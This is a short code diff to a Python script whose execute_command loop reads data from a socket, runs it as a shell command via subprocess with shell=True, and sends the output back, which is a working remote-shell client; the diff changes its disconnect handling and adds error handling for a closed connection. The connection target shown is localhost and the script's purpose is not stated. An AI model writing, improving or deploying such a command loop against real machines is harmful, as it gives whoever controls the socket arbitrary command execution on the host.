@@ -9,12 +9,20 @@ def connect_to_host(host, port):
 def execute_command(s):
     while True:
         data = s.recv(1024)
-        if data.decode("utf-8") == 'quit':
-            s.close()
+        print(data)
+
+        if not data:
             break
+
         proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc.stdout.read() + proc.stderr.read()
-        s.send(stdout_value)
+
+        # Check if the connection is still open before trying to send data
+        try:
+            s.send(stdout_value)
+        except BrokenPipeError:
+            print("Connection closed by the host.")
+            break
 
 def main():
     host = 'localhost'
